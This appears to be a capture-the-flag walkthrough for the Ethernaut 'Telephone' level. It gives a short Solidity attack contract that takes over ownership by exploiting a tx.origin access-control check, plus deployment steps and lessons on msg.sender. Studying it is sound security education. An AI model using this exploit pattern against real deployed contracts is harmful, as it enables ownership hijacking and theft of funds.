# Telephone

## Objective

Exploit the Telephone contract's flawed use of `tx.origin` in access control to become the new owner of the contract instance.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Telephone"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Write and Deploy the Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
     function changeOwner(address _owner) external;
}

contract TelephoneAttack {
     function attack(address target) public {
          ITelephone(target).changeOwner(msg.sender);
     }
}
```

**Explanation:**
This contract calls `changeOwner()` on the vulnerable Telephone contract. Since the call originates from a contract, `msg.sender` is the attack contract and `tx.origin` is your wallet, satisfying the flawed check.

---

### Step 2: Compile and Deploy the Attack Contract

- Compile `TelephoneAttack.sol` in Remix using Solidity 0.8.x
- Deploy the contract using the `Injected Provider - MetaMask` environment

**Explanation:**
Deploying the attack contract prepares you to interact with the Telephone instance as an intermediary, bypassing the `tx.origin` check.

---

### Step 3: Execute the Attack

```js
// In Remix, call:
attack(<TELEPHONE_CONTRACT_ADDRESS>)
```

**Explanation:**
Calling `attack()` with the Telephone contract address triggers the exploit, making you the new owner.

---

### Step 4: Confirm Ownership

```js
await contract.owner()
```

**Explanation:**
Verifies that your address is now the owner of the Telephone contract instance.

---

## What You Learn

This level teaches the following:

* Why `tx.origin` is unsafe for access control
* The difference between `msg.sender` and `tx.origin`
* How to exploit contracts that use improper authentication
* The importance of using `msg.sender` for authorization logic

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs – `tx.origin`](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
* [Remix IDE](https://remix.ethereum.org/)
* [External writeup](https://shubhamm.me/blog/ethernaut_challenges_telephone)

---
